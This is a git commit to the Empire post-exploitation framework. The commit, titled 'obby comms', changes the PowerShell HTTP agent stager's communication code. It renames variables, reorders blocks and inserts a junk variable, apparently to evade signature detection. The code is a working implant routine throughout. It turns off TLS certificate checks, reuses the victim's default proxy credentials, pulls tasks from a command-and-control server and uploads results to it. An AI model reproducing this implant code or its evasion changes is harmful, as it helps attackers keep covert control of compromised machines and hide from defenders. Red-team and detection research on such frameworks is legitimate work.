0408be7b17a2a7a313657fb54b809250d4847225
secur3 <ben.miller@ecfirst.com>
2024-07-17 14:18:54 -0500

    obby comms

--- empire/server/data/agent/stagers/http/comms.ps1
+++ empire/server/data/agent/stagers/http/comms.ps1
@@ -1,9 +1,48 @@
-$Script:server = "{{ host }}";
-$Script:ControlServers = @($Script:server);
+$sad = 12;
 $Script:ServerIndex = 0;
+$Script:server = "{{ host }}";
+
 if($server.StartsWith('https')){
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 }
+$Script:ControlServers = @($Script:server);
+
+$Script:GetTask = {
+    try {
+        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+
+            # meta 'TASKING_REQUEST' : 4
+            $RPacket = New-RoutingPacket -EncData $Null -Meta 4;
+            $RCook = [Convert]::ToBase64String($RPacket);
+
+            # build the web request object
+            $wc = New-Object System.Net.WebClient;
+
+            # set the proxy settings for the WC to be the default system settings
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
+            $wc.Headers.Add("User-Agent",$script:UserAgent);
+            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
+            $wc.Headers.Add("Cookie","{{ session_cookie }}session=$RCook");
+
+            # choose a random valid URI for checkin
+            $taskURI = $script:TaskURIs | Get-Random;
+            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
+            $result;
+        }
+    }
+    catch [Net.WebException] {
+        $script:MissedCheckins += 1;
+        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+            # restart key negotiation
+            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
+        }
+    }
+};
 
 $Script:SendMessage = {
     param($Packets)
@@ -14,7 +53,7 @@ $Script:SendMessage = {
 
         # build the top level RC4 "routing packet"
         # meta 'RESULT_POST' : 5
-        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
+        $RPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
 
         if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
             # build the web request object
@@ -32,7 +71,7 @@ $Script:SendMessage = {
             try {
                 # get a random posting URI
                 $taskURI = $Script:TaskURIs | Get-Random;
-                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RPacket);
             }
             catch [System.Net.WebException]{
                 # exception posting data...
@@ -44,40 +83,3 @@ $Script:SendMessage = {
             }
         }
     };
-
-$Script:GetTask = {
-    try {
-        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
-
-            # meta 'TASKING_REQUEST' : 4
-            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
-            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
-
-            # build the web request object
-            $wc = New-Object System.Net.WebClient;
-
-            # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
-            }
-
-            $wc.Headers.Add("User-Agent",$script:UserAgent);
-            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
-            $wc.Headers.Add("Cookie","{{ session_cookie }}session=$RoutingCookie");
-
-            # choose a random valid URI for checkin
-            $taskURI = $script:TaskURIs | Get-Random;
-            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
-            $result;
-        }
-    }
-    catch [Net.WebException] {
-        $script:MissedCheckins += 1;
-        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-            # restart key negotiation
-            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
-        }
-    }
-};
